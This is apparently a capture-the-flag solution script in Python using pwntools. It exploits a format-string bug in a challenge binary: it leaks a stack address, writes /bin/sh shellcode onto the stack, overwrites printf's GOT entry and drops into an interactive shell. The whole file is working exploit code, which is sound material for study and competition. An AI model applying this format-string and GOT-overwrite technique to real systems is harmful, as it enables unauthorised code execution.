from pwn import *
from pwnlib import shellcraft
import time

context.arch = 'amd64'
context.log_level =  "debug"

E = ELF("./nothing")
#r = gdb.debug("./nothing")
r = remote("pwn02.chal.ctf.westerns.tokyo", 18247)

r.recvuntil("> ")

def send_payload(data):
	r.sendline(data)
	time.sleep(1)
	dat = r.recv()
	return dat

stack = int(send_payload("START%%%p$pEND").replace(b"START%",b"").replace(b"$pEND\n> ",b""), 16)

format_string = FmtStr(execute_fmt=send_payload)

shellcode = asm(shellcraft.amd64.linux.sh()) + b"\x00"*8
target = stack-0x10000
for i in range(0, len(shellcode), 8):
	format_string.write(target+i, int.from_bytes(shellcode[i:i+8], "little"))
	format_string.execute_writes()

#format_string.write(E.got["printf"], target)
print(hex(target))

print("wrote shellcode")
format_string.write(E.got["printf"], target)
format_string.execute_writes()


r.interactive()


